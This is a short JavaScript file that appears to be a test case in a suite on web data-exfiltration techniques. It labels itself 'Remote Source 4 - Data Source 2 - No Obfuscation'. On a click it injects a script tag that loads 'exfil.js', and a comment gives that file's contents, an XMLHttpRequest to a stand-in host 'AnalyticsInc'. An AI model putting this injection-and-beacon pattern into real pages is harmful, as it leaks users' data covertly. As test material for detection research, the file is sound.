function exfiltrate_key_history() {

    // Remote Source 4 - Data Source 2 - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var URL = './exfil.js';
	var tags = document.getElementsByTagName("div");
	tags[0].setAttribute('data-src', URL);
    var script = document.createElement("script");
    script.src = tags[0].dataset.src;
	document.getElementsByTagName('head')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;

/*
exfil.js contents:

xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=remote", true);
xmlhttp.send(null);

*/
